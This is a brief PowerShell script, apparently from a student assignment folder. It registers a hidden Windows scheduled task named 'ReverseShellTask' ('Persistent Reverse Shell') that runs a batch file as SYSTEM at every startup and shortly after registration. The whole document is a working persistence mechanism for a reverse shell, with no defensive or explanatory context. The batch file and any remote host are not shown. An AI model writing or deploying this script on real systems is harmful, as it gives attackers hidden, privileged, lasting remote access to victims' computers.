
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\\Users\\cools\\Desktop\\Ass1\\Final\\images\\run_shell.bat"
$TriggerAtStartup = New-ScheduledTaskTrigger -AtStartup
$TriggerImmediate = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(15)
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -Action $Action -Trigger @($TriggerAtStartup, $TriggerImmediate) -Settings $Settings -Principal $Principal -TaskName "ReverseShellTask" -Description "Persistent Reverse Shell"
